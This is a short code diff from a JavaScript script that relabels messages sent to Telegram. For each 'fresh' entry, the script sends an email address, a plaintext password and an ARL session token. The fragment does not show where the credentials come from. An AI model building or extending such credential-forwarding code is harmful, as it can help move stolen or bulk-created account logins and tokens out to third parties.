@@ -223,9 +223,9 @@ async function main() {
       for (let i = 0; i < fresh.length; i++) {
         const e = fresh[i];
         await sendTelegram(`<b>— ${i + 1}/${fresh.length} —</b>`);
-        await sendTelegram(`📧 <code>${esc(e.email)}</code>`);
-        await sendTelegram(`🔑 <code>${esc(e.password)}</code>`);
-        await sendTelegram(`<code>${esc(e.arl)}</code>`);
+        await sendTelegram(`📧 Email:\n<code>${esc(e.email)}</code>`);
+        await sendTelegram(`🔑 Password:\n<code>${esc(e.password)}</code>`);
+        await sendTelegram(`🎫 ARL:\n<code>${esc(e.arl)}</code>`);
         await delay(500);
       }
     } else {
